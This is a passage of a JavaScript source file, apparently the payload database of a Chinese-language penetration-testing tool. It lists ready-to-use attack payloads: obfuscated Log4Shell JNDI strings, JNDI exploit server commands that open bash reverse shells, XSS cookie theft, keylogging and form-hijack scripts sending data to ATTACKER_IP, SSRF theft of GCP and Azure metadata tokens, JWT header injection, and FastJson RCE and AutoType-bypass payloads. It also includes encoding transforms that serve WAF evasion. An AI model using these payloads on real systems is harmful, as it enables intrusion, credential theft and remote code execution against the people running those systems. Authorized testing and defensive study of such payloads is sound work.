        { title: '6. WAF 绕过: lower', cmd: '${${lower:j}ndi:ldap://ATTACKER_IP:1389/a}', desc: '使用 ${lower:x} 混淆 jndi 关键字' },
        { title: '7. WAF 绕过: ::-', cmd: '${${::-j}${::-n}${::-d}${::-i}:ldap://ATTACKER_IP:1389/a}', desc: '使用 ${::-x} 逐个字符拼接 jndi' },
        { title: '8. WAF 绕过: upper/lower 混用', cmd: '${${upper:j}${lower:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${upper:p}://ATTACKER_IP:1389/a}', desc: '大小写混合绕过关键字匹配' },
        { title: '9. DNS 协议替代', cmd: '${jndi:dns://ATTACKER.dnslog.cn}', desc: '使用 DNS 协议替代 LDAP 绕过出站限制' }
      ],
      bypass: [
        { technique: '头部注入', desc: '通过 HTTP Header 注入', cmds: ['X-Forwarded-For: ${jndi:ldap://ATTACKER.dnslog.cn}', 'User-Agent: ${jndi:ldap://ATTACKER.dnslog.cn}', 'Cookie: ${jndi:ldap://ATTACKER.dnslog.cn}'] },
        { technique: '工具', desc: '使用 JNDIExploit / rogue-jndi 搭建利用服务', cmds: ['java -jar JNDIExploit-1.4-SNAPSHOT.jar -i ATTACKER_IP', 'java -jar rogue-jndi.jar -c "bash -c {echo,BASE64}|{base64,-d}|{bash,-i}"'] }
      ]
    },

    // ── XSS 扩展 ──
    {
      id: 'xss-cookie-01', cat: 'xss', sub: 'Cookie窃取',
      title: 'Cookie 窃取与外带链',
      steps: [
        { title: '1. Image 外带', cmd: '<img src=x onerror="new Image().src=\'http://ATTACKER_IP:8080/?c=\'+document.cookie">', desc: '通过 Image 对象 GET 请求外带 Cookie' },
        { title: '2. fetch 外带', cmd: '<img src=x onerror="fetch(\'http://ATTACKER_IP:8080/?c=\'+document.cookie)">', desc: '使用 fetch API 外带' },
        { title: '3. sendBeacon', cmd: '<img src=x onerror="navigator.sendBeacon(\'http://ATTACKER_IP:8080/\',document.cookie)">', desc: 'sendBeacon 异步发送，页面卸载时仍可发送' },
        { title: '4. WebSocket 外带', cmd: "<script>var ws=new WebSocket('ws://ATTACKER_IP:8080');ws.onopen=function(){ws.send(document.cookie)}</script>", desc: 'WebSocket 双向通信外带' },
        { title: '5. DNS 外带 (盲打)', cmd: '<img src=x onerror="new Image().src=\'http://\'+btoa(document.cookie).replace(/=/g,\'\')+\'.ATTACKER.dnslog.cn\'">', desc: 'DNS 外带绕过 HTTP 出站限制' }
      ],
      bypass: []
    },
    {
      id: 'xss-beef-01', cat: 'xss', sub: '框架利用',
      title: 'BeEF 浏览器渗透框架 Hook',
      steps: [
        { title: '1. 直接 Hook', cmd: '<script src="http://ATTACKER_IP:3000/hook.js"></script>', desc: '加载 BeEF hook.js，浏览器上线' },
        { title: '2. Base64 加载 Hook', cmd: '<script>eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9BVFRBQ0tFUl9JUDozMDAwL2hvb2suanMnO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk7"))</script>', desc: 'Base64 编码 hook 加载逻辑' },
        { title: '3. 延迟 Hook', cmd: '<body onload="setTimeout(function(){var s=document.createElement(\'script\');s.src=\'http://ATTACKER_IP:3000/hook.js\';document.body.appendChild(s)},3000)">', desc: '延迟加载 Hook 绕过即时检测' }
      ],
      bypass: []
    },
    {
      id: 'xss-keylog-01', cat: 'xss', sub: '信息窃取',
      title: 'XSS 键盘记录 & 表单劫持',
      steps: [
        { title: '1. 键盘记录', cmd: '<script>document.addEventListener("keydown",function(e){new Image().src="http://ATTACKER:8080/?k="+e.key})</script>', desc: '监听所有按键并外带到攻击者服务器' },
        { title: '2. 缓冲键盘记录', cmd: '<script>var b="";document.onkeydown=function(e){if(e.key==="Enter"){new Image().src="http://ATTACKER:8080/?d="+btoa(b);b=""}else{b+=e.key}}</script>', desc: '缓冲输入，按 Enter 时一次性发送 (省请求)' },
        { title: '3. 密码框劫持', cmd: '<script>document.querySelectorAll("input[type=password]").forEach(function(i){i.addEventListener("change",function(){new Image().src="http://ATTACKER:8080/?p="+this.value})})</script>', desc: '监听密码框 change 事件外带密码' },
        { title: '4. 全表单劫持', cmd: '<script>document.querySelector("form").addEventListener("submit",function(){var d=Array.from(this.elements).map(function(e){return e.name+":"+e.value}).join("|");new Image().src="http://ATTACKER:8080/?d="+btoa(d)})</script>', desc: '拦截表单提交，外带所有字段值' },
        { title: '5. 截屏 (HTML2Canvas)', cmd: '<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script><script>html2canvas(document.body).then(function(c){new Image().src="http://ATTACKER:8080/?img="+c.toDataURL().slice(0,500)})</script>', desc: '截取当前页面发送给攻击者' }
      ],
      bypass: []
    },
    {
      id: 'xss-poly-01', cat: 'xss', sub: 'Polyglot',
      title: 'XSS Multi-Context Polyglot 合集',
      steps: [
        { title: '1. 经典 Polyglot', cmd: 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/+/alert(1)//\'>', desc: '跨 HTML/JS/CSS 上下文的万能 Polyglot' },
        { title: '2. 多事件 Polyglot', cmd: '\'"><img src=x onerror=alert(1) id=x tabindex=1 onfocus=eval(name) autofocus>', desc: '同时利用 onerror + onfocus 双重事件' },
        { title: '3. SVG Polyglot', cmd: '<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>', desc: 'SVG CDATA 内嵌 HTML 标签' },
        { title: '4. MathML mXSS', cmd: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>', desc: '通过 MathML 嵌套触发浏览器解析变异' },
        { title: '5. noscript mXSS', cmd: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', desc: 'noscript 标签内的 HTML 编码变异' }
      ],
      bypass: []
    },

    // ── SSRF 扩展 ──
    {
      id: 'ssrf-gcp-01', cat: 'ssrf', sub: '云元数据',
      title: 'GCP 元数据窃取链',
      steps: [
        { title: '1. 探测 GCP 端点', cmd: 'http://metadata.google.internal/computeMetadata/v1/', desc: '请求 GCP 元数据根路径 (需 Header: Metadata-Flavor: Google)' },
        { title: '2. 获取 Token', cmd: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', desc: '获取默认 Service Account 的 OAuth Token' },
        { title: '3. 获取 SSH 密钥', cmd: 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys', desc: '读取项目级别 SSH 公钥' },
        { title: '4. GKE Kubelet 凭据', cmd: 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env', desc: 'GKE 节点上的 Kubernetes 环境变量' }
      ],
      bypass: [
        { technique: 'Header 添加', desc: 'GCP 需要 Metadata-Flavor: Google 头才能访问', cmds: ['metadata.google.internal (需服务端能自定义 Header)'] }
      ]
    },
    {
      id: 'ssrf-azure-01', cat: 'ssrf', sub: '云元数据',
      title: 'Azure 元数据窃取链',
      steps: [
        { title: '1. 探测 Azure 端点', cmd: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', desc: '请求 Azure IMDS 元数据 (需 Header: Metadata: true)' },
        { title: '2. 获取 Token', cmd: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', desc: '获取 Azure 托管标识 OAuth Token' }
      ],
      bypass: []
    },
    {
      id: 'ssrf-dns-01', cat: 'ssrf', sub: '绕过',
      title: 'SSRF DNS 重绑定 & IP 绕过链',
      steps: [
        { title: '1. nip.io 重绑定', cmd: 'http://127.0.0.1.nip.io/admin', desc: 'nip.io 将 IP 前缀解析为对应地址, 绕过 hostname 白名单' },
        { title: '2. 八进制 IP', cmd: 'http://0177.0.0.1/admin', desc: '127.0.0.1 = 0177.0.0.1 (八进制)' },
        { title: '3. 十进制 IP', cmd: 'http://2130706433/admin', desc: '127.0.0.1 = 2130706433 (十进制整数)' },
        { title: '4. 十六进制 IP', cmd: 'http://0x7f000001/admin', desc: '127.0.0.1 = 0x7f000001' },
        { title: '5. IPv6 回环', cmd: 'http://[::1]/admin', desc: 'IPv6 环回地址' },
        { title: '6. URL 解析混淆', cmd: 'http://target.com#@127.0.0.1/', desc: '利用 # 锚点混淆: 实际请求 host 为 target.com' },
        { title: '7. URL 凭证混淆', cmd: 'http://trusted.com@127.0.0.1:8080/admin', desc: 'trusted.com 作为 Basic Auth 用户名, 实际连接 127.0.0.1' }
      ],
      bypass: [
        { technique: 'DNS Rebinding 工具', desc: '专用 DNS 重绑定平台', cmds: ['http://7f000001.cip.cc', 'http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network'] }
      ]
    },

    // ── JWT 扩展 ──
    {
      id: 'jwt-jwk-01', cat: 'jwt', sub: '注入',
      title: 'JWT JWK/JKU/x5c 注入攻击链',
      steps: [
        { title: '1. JWK 注入', cmd: '{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"ATTACKER_RSA_N","e":"AQAB"}}', desc: '在 JWT Header 中嵌入攻击者生成的 RSA 公钥, 服务端可能用此公钥验签' },
        { title: '2. JKU 注入', cmd: '{"alg":"RS256","typ":"JWT","jku":"http://ATTACKER/.well-known/jwks.json"}', desc: 'jku 指向攻击者托管 JWKS, 服务端获取公钥验签' },
        { title: '3. x5c 注入', cmd: '{"alg":"RS256","x5c":["ATTACKER_X509_BASE64"]}', desc: '嵌入自签名证书 Base64, 替换合法证书' },
        { title: '4. kid SQL 注入', cmd: '{"alg":"HS256","kid":"1\' UNION SELECT \'hacked\'--","typ":"JWT"}', desc: 'kid 参数存在 SQL 注入, 通过 UNION 控制签名密钥' },
        { title: '5. kid 路径遍历', cmd: '{"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}', desc: 'kid 路径遍历指向 /dev/null (空密钥), 用空字符串签名' },
        { title: '6. 暴力破解密钥', cmd: 'hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt', desc: 'hashcat mode 16500 爆破 HS256/HS384/HS512 JWT 密钥' },
        { title: '7. jwt_tool 全套', cmd: 'python3 jwt_tool.py JWT_TOKEN -X s -pr attacker.key', desc: 'jwt_tool 生成 x5c JWK 签名; -C 爆破密钥; -T 篡改 payload' }
      ],
      bypass: []
    },

    // ── FastJson ──
    {
      id: 'fastjson-detect-01', cat: 'fastjson', sub: '检测',
      title: 'FastJson 检测与版本探测链',
      steps: [
        { title: '1. JSON 破坏报错', cmd: '{"name":"test"', desc: '删除末尾 } — FastJson 报错特征 "syntax error, expect }..." 识别引擎' },
        { title: '2. Autotype 报错', cmd: '{"@type":"whatever"}', desc: '@type 触发 FastJson 特有异常 "autoType is not support"' },
        { title: '3. DNS 出网探活', cmd: '{"@type":"java.net.Inet4Address","val":"YOUR.dnslog.cn"}', desc: 'Inet4Address 发起 DNS 请求 (1.2.24-1.2.83 通用)，确认 FastJson 且出网' },
        { title: '4. InetSocketAddress 探测', cmd: '{"@type":"java.net.InetSocketAddress"{"address":,"val":"YOUR.dnslog.cn"}}', desc: 'InetSocketAddress 变体，绕过部分 @type 过滤' },
        { title: '5. 版本探测 (1)', cmd: '{"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}', desc: '不报错=1.2.24/1.2.83, 报错=1.2.25-1.2.80' },
        { title: '6. 版本探测 (2)', cmd: '{"zero":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}', desc: '不报错=1.2.24-1.2.68, 报错=1.2.70-1.2.83' },
        { title: '7. 版本探测 (3)', cmd: '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl"}}', desc: '不报错=1.2.24-1.2.47, 报错=1.2.48-1.2.83' }
      ],
      bypass: []
    },
    {
      id: 'fastjson-jndi-01', cat: 'fastjson', sub: 'JNDI注入',
      title: 'FastJson JNDI 注入 RCE (<=1.2.24)',
      steps: [
        { title: '1. JdbcRowSetImpl JNDI (RMI)', cmd: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://ATTACKER_IP:1099/Exploit","autoCommit":true}', desc: '通过 RMI 协议加载远程恶意类 → RCE (<=1.2.24 默认开启 AutoType)' },
        { title: '2. JdbcRowSetImpl JNDI (LDAP)', cmd: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER_IP:1389/Exploit","autoCommit":true}', desc: 'LDAP 协议加载恶意类 (兼容性更好，绕过 RMI filter)' },
        { title: '3. 嵌套 JSONObject 通用 Payload', cmd: '{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER_IP:1389/Exploit","autoCommit":true}}""}', desc: 'parseObject 场景下的嵌套通用 payload' },
        { title: '4. JNDI 利用工具', cmd: 'java -jar JNDI-Injection-Exploit-Plus-1.0-SNAPSHOT-all.jar -C "bash -c {echo,BASE64}|{base64,-d}|{bash,-i}" -A ATTACKER_IP', desc: 'JNDI-Injection-Exploit-Plus 一键反弹 Shell' },
        { title: '5. Marshalsec 启动 LDAP', cmd: 'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ATTACKER_IP:8000/#Exploit 1389', desc: 'marshalsec 启动恶意 LDAP 服务，Exploit.class 放在 HTTP 目录' },
        { title: '6. JDK 版本限制参考', cmd: 'JDK 6u45-/7u21-: RMI Remote Object\nJDK 6u141-/7u131-/8u121-: RMI+JNDI\nJDK 11.0.1-/8u191-/7u201-/6u211-: LDAP+JNDI\n高版本 JDK: 需本地 Gadget 链或 FastJson 原生反序列化', desc: '根据 JDK 版本选用对应 JNDI 注入方式' }
      ],
      bypass: [
        { technique: 'Unicode/Hex 编码', desc: '对 @type 值进行 Unicode/Hex 编码绕过关键字 WAF', cmds: ['{"\\u0040\\u0074\\u0079\\u0070\\u0065":"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c","dataSourceName":"rmi://127.0.0.1:1099/Exploit","autoCommit":true}', '{"\\x40\\x74\\x79\\x70\\x65":"\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e...","dataSourceName":"rmi://127.0.0.1:1099/Exploit","autoCommit":true}'] },
        { technique: '多余逗号混淆', desc: '添加多余逗号干扰 JSON 语法检测', cmds: ['{,,,,,,"@type":"com.sun.rowset.JdbcRowSetImpl",,,,,,"dataSourceName":"rmi://127.0.0.1:1099/Exploit",,,,,, "autoCommit":true}'] }
      ]
    },
    {
      id: 'fastjson-autotype-01', cat: 'fastjson', sub: 'AutoType绕过',
      title: 'FastJson AutoType 黑名单绕过链 (1.2.25-1.2.47)',
      steps: [
        { title: '1. L; 后缀绕过 (1.2.25-1.2.41)', cmd: '{"rand1":{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://ATTACKER_IP:1389/Object","autoCommit":true}}', desc: 'L; 前缀后缀绕过黑名单类名匹配 (需开启 autoTypeSupport)' },
        { title: '2. LL;; 后缀绕过 (1.2.42)', cmd: '{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}', desc: 'LL;; 双写绕过 1.2.42 的黑名单增强' },
        { title: '3. [{}] 数组绕过 (1.2.43)', cmd: '{"rand1":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}]}}', desc: '通过数组类型语法绕过黑名单验证' },
        { title: '4. Mybatis JNDI 绕过 (1.2.45)', cmd: '{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://ATTACKER_IP:1389/Exploit"}}', desc: '利用 Mybatis JndiDataSourceFactory 类绕过 (1.2.25-1.2.45)' },
        { title: '5. java.lang.Class 缓存绕过 (1.2.25-1.2.47 通用)', cmd: '{"rand1":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"rand2":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER_IP:1389/Exploit","autoCommit":true}}', desc: '先通过 Class 加载将 JdbcRowSetImpl 缓存，再直接引用绕过黑名单 (无需开启 autoTypeSupport)' },
        { title: '6. Shiro JNDI 绕过', cmd: '{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://ATTACKER_IP:1389/Exploit"}', desc: 'Shiro 环境下的 JNDI 注入利用' },
        { title: '7. c3p0 JNDI 绕过', cmd: '{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://ATTACKER_IP:1389/Exploit","loginTimeout":0}', desc: 'c3p0 连接池 JNDI 注入' }
      ],
      bypass: []
    },
    {
      id: 'fastjson-bcel-01', cat: 'fastjson', sub: 'BCEL',
      title: 'FastJson BCEL 字节码执行 (tomcat-dbcp)',
      steps: [
        { title: '1. 生成 BCEL 编码', cmd: '# 使用 Fastjson-BCELCoder 将 .class 编码为 $$BCEL$$ 字符串\n# https://github.com/flamingo-gx/Fastjson-BCELCoder/', desc: '将恶意类字节码转为 BCEL 编码字符串' },
        { title: '2. dbcp2 BCEL 执行 (Tomcat 8+)', cmd: '{\n  {\n    "@type": "com.alibaba.fastjson.JSONObject",\n    "x": {\n      "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",\n      "driverClassLoader": {\n        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"\n      },\n      "driverClassName": "$$BCEL$$...<编码>..."\n    }\n  }: "x"\n}', desc: '通过 tomcat-dbcp2 BasicDataSource 加载 BCEL 字节码执行 (fastjson <= 1.2.24, JDK < 8u251)' },
        { title: '3. dbcp1 BCEL 执行 (Tomcat 7)', cmd: '用 org.apache.tomcat.dbcp.dbcp.BasicDataSource 替换上述 dbcp2 类名', desc: 'Tomcat 7 使用 dbcp 1.x 版本' },
        { title: '4. commons-dbcp BCEL', cmd: '用 org.apache.commons.dbcp.BasicDataSource / org.apache.commons.dbcp2.BasicDataSource', desc: 'Apache Commons DBCP 通用场景' },
        { title: '5. 不出网回显利用', cmd: '# 利用 URLClassLoader 加载本地 jar 或直接写文件\n# 参考: https://xz.aliyun.com/t/12492', desc: 'BCEL 方式不依赖出网，适合纯内网目标' }
      ],
      bypass: []
    },
    {
      id: 'fastjson-templates-01', cat: 'fastjson', sub: 'TemplatesImpl',
      title: 'FastJson TemplatesImpl 字节码执行 + 依赖探测',
      steps: [
        { title: '1. TemplatesImpl 利用 (需 Feature)', cmd: '{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["<恶意类Base64>"],"_name":"exp","_tfactory":{},"_outputProperties":{}}', desc: '需代码启用 Feature.SupportNonPublicField，恶意类须继承 AbstractTranslet' },
        { title: '2. 生成恶意类', cmd: '// 1. 使用 javassist 生成继承 AbstractTranslet 的类\n// 2. 在构造函数中写入 Runtime.getRuntime().exec("cmd")\n// 3. javac 编译 → Base64 编码 → 填入 _bytecodes', desc: 'TemplatesImpl 利用链的恶意类构造步骤' },
        { title: '3. 依赖探测 (SpringBoot)', cmd: '{"z":{"@type":"java.lang.Class","val":"org.springframework.web.bind.annotation.RequestMapping"}}', desc: '返回实例=存在，返回 null=不存在 (1.2.47 及之前)' },
        { title: '4. 依赖探测 (Tomcat)', cmd: '{"@type":"java.lang.Character"{"@type":"java.lang.Class","val":"org.apache.catalina.startup.Tomcat"}}', desc: '类存在时转换报错，不存在时返回 null' },
        { title: '5. 依赖探测 (Groovy)', cmd: '{"@type":"java.lang.Character"{"@type":"java.lang.Class","val":"groovy.lang.GroovyShell"}}', desc: '探测 Groovy 依赖是否存在，用于高版本 JDK 绕过' },
        { title: '6. c3p0 二次反序列化', cmd: '{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:<Hex编码序列化对象>;"}', desc: 'c3p0 + Hex 编码二次反序列化触发 Gadget 链' },
        { title: '7. Groovy 高版 JDK 绕过 (1.2.80)', cmd: '{"@type":"groovy.lang.GroovyShell",<GroovyClassLoader参数>}', desc: '1.2.80 版本利用 Groovy 依赖在高版 JDK 中执行字节码' }
      ],
      bypass: []
    },

    // ── 其他 ──
    {
      id: 'other-clickjack-01', cat: 'other', sub: '点击劫持',
      title: 'Clickjacking 点击劫持验证 (X-Frame-Options 缺失)',
      steps: [
        { title: '1. 验证 PoC', cmd: '<html>\n<head><title>Clickjacking Test</title></head>\n<body>\n  <iframe src="https://TARGET.com/login" width="800" height="600"></iframe>\n</body>\n</html>', desc: '将目标页面嵌入 iframe，能正常加载说明缺少 X-Frame-Options 头，存在点击劫持风险' },
        { title: '2. 透明叠加攻击', cmd: '<html>\n<head>\n<style>\n  iframe { position: absolute; top: 0; left: 0; opacity: 0.001; z-index: 2; width: 800px; height: 600px; }\n  .decoy { position: absolute; top: 0; left: 0; z-index: 1; }\n</style>\n</head>\n<body>\n  <div class="decoy"><h1>点击领取奖品!</h1><button>立即领取</button></div>\n  <iframe src="https://TARGET.com/sensitive-action"></iframe>\n</body>\n</html>', desc: '将目标页面透明覆盖在诱饵页面上，用户以为点击按钮实际点击了目标页面的操作' },
        { title: '3. 检测响应头', cmd: 'curl -I https://TARGET.com | grep -i "x-frame-options"\n# 检查返回值:\n# 无此头 = 存在风险\n# DENY = 安全(禁止所有frame)\n# SAMEORIGIN = 安全(仅同源允许)', desc: '通过 curl 检查目标是否配置了 X-Frame-Options 响应头' },
        { title: '4. CSP frame-ancestors 检测', cmd: 'curl -I https://TARGET.com | grep -i "content-security-policy"\n# 检查是否存在 frame-ancestors 指令\n# frame-ancestors \'none\' = 安全\n# frame-ancestors TARGET.com = 安全(SAMEORIGIN)', desc: 'Content-Security-Policy 的 frame-ancestors 也可防御点击劫持' }
      ],
      bypass: [
        { technique: '双重 iframe 沙箱', desc: '某些情况下可用 sandbox 属性绕过', cmds: ['<iframe src="https://TARGET.com" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>'] }
      ]
    },
    {
      id: 'other-jquery-xss-01', cat: 'other', sub: 'jQuery',
      title: 'jQuery 低版本 XSS 漏洞验证 (CVE-2020-11022/CVE-2020-11023)',
      steps: [
        { title: 'PoC 验证页面', cmd: '<!DOCTYPE html>\n<html>\n\n<head>\n    <meta charset="utf-8">\n    <title>jQuery XSS Examples (CVE-2020-11022/CVE-2020-11023)</title>\n    <script src="https://TARGET.COM/path/to/jquery.min.js"></script>\n</head>\n\n<body>\n    <script>\n        function test(n, jq) {\n            sanitizedHTML = document.getElementById(\'poc\' + n).innerHTML;\n            if (jq) {\n                $(\'#div\').html(sanitizedHTML);\n            } else {\n                div.innerHTML = sanitizedHTML;\n            }\n        }\n    </script>\n    <h1>jQuery XSS Examples (CVE-2020-11022/CVE-2020-11023)</h1>\n\n    <h2>PoC 1</h2>\n    <button onclick="test(1)">Assign to innerHTML</button> <button onclick="test(1,true)">Append via .html()</button>\n    <xmp id="poc1"><style><style /><img src=x onerror=alert(\'XSS\')></xmp>\n\n    <h2>PoC 2 (Only jQuery 3.x affected)</h2>\n    <button onclick="test(2)">Assign to innerHTML</button> <button onclick="test(2,true)">Append via .html()</button>\n    <xmp id="poc2"><img alt="<x" title="/><img src=x onerror=alert("XSS")>"></xmp>\n\n    <h2>PoC 3</h2>\n    <button onclick="test(3)">Assign to innerHTML</button> <button onclick="test(3,true)">Append via .html()</button>\n    <xmp id="poc3"><option><style></option></select><img src=x onerror=alert("XSS")></style></xmp>\n\n    <div id="div"></div>\n</body>\n\n</html>', desc: '将 <script src> 中 jQuery 路径替换为目标实际路径。影响 jQuery < 3.5.0，若弹窗出现说明存在漏洞' }
      ],
      bypass: []
    }
  ];

  // ========== 变换函数 ==========

  function urlEncode(str) {
    return encodeURIComponent(str);
  }

  function urlDoubleEncode(str) {
    return encodeURIComponent(encodeURIComponent(str));
  }

  function base64Encode(str) {
    try {
      return btoa(unescape(encodeURIComponent(str)));
    } catch (e) {
      return btoa(str);
    }
  }

  function hexEncode(str) {
    var result = '';
    for (var i = 0; i < str.length; i++) {
      var hex = str.charCodeAt(i).toString(16);
      result += (hex.length === 1 ? '0' : '') + hex + ' ';
    }
    return result.trim();
  }

  function toUpperCase(str) {
    return str.toUpperCase();
  }

  function toLowerCase(str) {
    return str.toLowerCase();
  }

  function caseMix(str) {
    var result = '';
    for (var i = 0; i < str.length; i++) {
      result += i % 2 === 0 ? str[i].toUpperCase() : str[i].toLowerCase();
    }
    return result;
  }

  function htmlEntity(str) {
    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
  }

  function unicodeEscape(str) {
    var result = '';
    for (var i = 0; i < str.length; i++) {
      var code = str.charCodeAt(i).toString(16).toUpperCase();
      result += '\\u' + ('0000' + code).slice(-4);
    }
    return result;
  }

  function doubleWrite(str) {
    return str.replace(/([a-zA-Z]{2,})/g, function (m) {
      return m + m;
    });
  }

  function commentObfuscate(str) {
    return str.replace(/\s+/g, '/**/');
  }

  function jsStringEscape(str) {
    return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"')
      .replace(/\n/g, '\\n').replace(/\r/g, '\\r');
  }

  var TRANSFORMS = [
    { id: 'url',      label: 'URL 编码',        fn: urlEncode },
    { id: 'url2',     label: '双重 URL 编码',   fn: urlDoubleEncode },
    { id: 'base64',   label: 'Base64',           fn: base64Encode },
    { id: 'hex',      label: 'Hex',              fn: hexEncode },
    { id: 'html',     label: 'HTML 实体',        fn: htmlEntity },
    { id: 'unicode',  label: 'Unicode 转义',     fn: unicodeEscape },
    { id: 'upper',    label: '全大写',           fn: toUpperCase },
    { id: 'lower',    label: '全小写',           fn: toLowerCase },
    { id: 'caseMix',  label: '大小写混淆',       fn: caseMix },
    { id: 'double',   label: '双写绕过',         fn: doubleWrite },
    { id: 'comment',  label: '注释混淆',         fn: commentObfuscate },
    { id: 'jsEscape', label: 'JS 转义',          fn: jsStringEscape }
  ];

  function applyTransform(text, transformId) {
    for (var i = 0; i < TRANSFORMS.length; i++) {
      if (TRANSFORMS[i].id === transformId) {
        return TRANSFORMS[i].fn(text);
      }
    }
    return text;
  }

  // ========== 搜索 ==========
  function search(query) {
    if (!query || !query.trim()) return SCENARIOS;
    var q = query.toLowerCase().trim();
    return SCENARIOS.filter(function (s) {
      if (s.title.toLowerCase().indexOf(q) !== -1) return true;
      if (s.sub.toLowerCase().indexOf(q) !== -1) return true;
      for (var i = 0; i < s.steps.length; i++) {
        if (s.steps[i].cmd.toLowerCase().indexOf(q) !== -1) return true;
        if (s.steps[i].title.toLowerCase().indexOf(q) !== -1) return true;
        if (s.steps[i].desc.toLowerCase().indexOf(q) !== -1) return true;
      }
      if (s.bypass) {
        for (var j = 0; j < s.bypass.length; j++) {
          if (s.bypass[j].technique.toLowerCase().indexOf(q) !== -1) return true;
          if (s.bypass[j].desc.toLowerCase().indexOf(q) !== -1) return true;
          for (var k = 0; k < s.bypass[j].cmds.length; k++) {
            if (s.bypass[j].cmds[k].toLowerCase().indexOf(q) !== -1) return true;
          }
        }
      }
      return false;
    });
  }

  function getByCategory(catId) {
    if (!catId) return SCENARIOS;
    return SCENARIOS.filter(function (s) {
      return s.cat === catId;
    });
  }

  function getById(id) {
    for (var i = 0; i < SCENARIOS.length; i++) {
      if (SCENARIOS[i].id === id) return SCENARIOS[i];
    }
    return null;
  }

  function getCategoryLabel(catId) {
    for (var i = 0; i < CATEGORIES.length; i++) {
      if (CATEGORIES[i].id === catId) return CATEGORIES[i].label;
    }
    return catId;
  }

  function getSubcategories(catId) {
    var items = catId ? getByCategory(catId) : SCENARIOS;
    var seen = {};
    var result = [];
    for (var i = 0; i < items.length; i++) {
      var sub = items[i].sub;
      if (!seen[sub]) {
        seen[sub] = true;
        result.push(sub);
      }
    }
    return result;
  }

  // ========== 扁平化所有场景 → Payload 列表 ==========
  function flattenScenarios(scenarios) {
    var result = [];
    scenarios.forEach(function (s) {
      s.steps.forEach(function (step) {
        result.push({
          cmd: step.cmd,
          desc: step.desc,
          title: step.title,
          db: s.db || null,
          cat: s.cat,
          sub: s.sub,
          scenarioTitle: s.title,
          isBypass: false
        });
      });
      if (s.bypass) {
        s.bypass.forEach(function (bp) {
          bp.cmds.forEach(function (cmd) {
            result.push({
              cmd: cmd,
              desc: bp.desc,
              title: bp.technique,
              db: s.db || null,
              cat: s.cat,
              sub: s.sub,
              scenarioTitle: s.title,
              isBypass: true
            });
          });
        });
      }
    });
    return result;
  }

  return {
    CATEGORIES: CATEGORIES,
    SCENARIOS: SCENARIOS,
    TRANSFORMS: TRANSFORMS,
    flattenScenarios: flattenScenarios,
    search: search,
    getByCategory: getByCategory,
    getById: getById,
    getCategoryLabel: getCategoryLabel,
    getSubcategories: getSubcategories,
    applyTransform: applyTransform
  };
})();

if (typeof self !== 'undefined') {
  self.StiffEyesPayloads = StiffEyesPayloads;
}
